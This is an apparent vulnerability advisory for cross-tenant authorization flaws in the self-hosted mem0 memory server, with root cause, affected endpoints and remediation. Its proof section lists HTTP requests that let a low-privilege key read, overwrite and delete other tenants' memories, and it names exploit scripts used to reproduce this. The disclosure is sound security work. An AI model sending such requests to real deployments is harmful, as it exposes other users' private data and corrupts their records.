## MEM0-2026-01 — Broken tenant authorization

### Summary
The self-hosted mem0 server authenticates callers but never authorizes them against the
namespace or record they address. Every memory endpoint accepts a caller-supplied
`user_id`, `agent_id`, `run_id` or memory `id` and performs no ownership check. The only
role gate in the API — the unfiltered `GET /memories` listing — is bypassed by supplying
any identifier.

### Root cause
- `server/routers/entities.py:45` and `server/main.py:322-524` depend on `verify_auth`,
  which establishes identity but is never compared to the namespaced data.
- Core `mem0/memory/main.py` `get`, `get_all`, `search`, `update`, `delete`, `history`
  operate on caller-supplied identifiers with no scope predicate; `_get_memory_by_id`
  (`mem0/memory/main.py:1222-1267`) resolves by ID alone.
- The server ignores the `Mem0-User-ID` header the official client sends
  (`mem0/client/main.py`, `_client_headers`); tenant scoping is client-side only.

### Affected endpoints
`GET /entities`, `GET /memories?user_id=`, `GET /memories/{id}`, `GET /memories/{id}/history`,
`PUT /memories/{id}`, `DELETE /memories/{id}`, `POST /search`.

Scope note: this request covers **memory-namespace authorization only**. The related
`GET /configure` disclosure (same missing role gate, different data class) is tracked
separately as **MEM0-2026-02** and is intentionally not part of this CVE.

### Proof (low-privilege `role=user` key)
```
GET /entities                                    -> 200  every tenant listed
GET /memories?user_id=alice_tenant               -> 200  victim record (PII, token)
GET /memories/{id}                               -> 200  full record
GET /memories/{id}/history                       -> 200  mutation history
POST /search {"filters":{"user_id":"alice_tenant"},"threshold":0} -> 200
PUT /memories/{id} {"text":"overwritten"}        -> 200
DELETE /memories/{id}                            -> 200
GET /memories                                    -> 403  role gate exists, bypassed above
```

### Reproduction
```bash
git clone https://github.com/mem0ai/mem0 && cd mem0 && git checkout f1791da
MEM0_SRC=$PWD ./poc/setup_local.sh        # pgvector + venv + stub OpenAI + 2 principals
BASE=http://127.0.0.1:8000 KEY=<role=user key> VICTIM=alice_tenant ./poc/poc_cross_tenant.sh
# assertion-gated: 14 checks, exit 0 only on full confirmation
BASE=http://127.0.0.1:8000 ATTACKER_KEY=<key> VICTIM_KEY=<key> VICTIM=alice_tenant \
  python3 poc/exploit.py --json transcript.json
```

### Impact
Read of every tenant's memories (PII, credentials, conversation history); silent poisoning
of records consumed by other tenants' agents; deletion of other tenants' memories.

### Remediation
Derive the namespace from the authenticated principal and reject mismatches; assert stored
`user_id` on `/memories/{id}` and `/history`; require admin for `/entities`; treat
`Mem0-User-ID` as untrusted; regression test asserting 403/404 on a foreign namespace.
